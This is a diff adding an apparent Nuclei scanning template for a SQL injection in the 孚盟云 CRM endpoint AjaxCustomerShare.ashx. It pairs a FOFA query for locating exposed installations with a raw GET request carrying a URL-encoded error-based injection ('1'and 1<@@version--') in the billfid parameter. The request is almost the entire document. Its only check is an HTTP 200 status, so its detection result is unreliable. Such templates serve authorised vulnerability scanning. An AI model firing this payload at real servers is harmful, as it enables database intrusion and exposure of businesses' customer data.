@@ -1,0 +1,19 @@
+id: poc-wgrmsdw5emcylr24
+info:
+  name: 孚盟云CRM AjaxCoustomerShare.ashx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wgrmsdw5emcylr24'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wgrmsdw5emcylr24
+    fofa: app="孚盟软件-孚盟云"
+http:
+- raw:
+  - GET /m/Dingding/Ajax/AjaxCustomerShare.ashx?method=DeleteEmpID&billfid=%31%27%61%6e%64%20%31%3c%40%40%76%65%72%73%69%6f%6e--&empid=1 HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
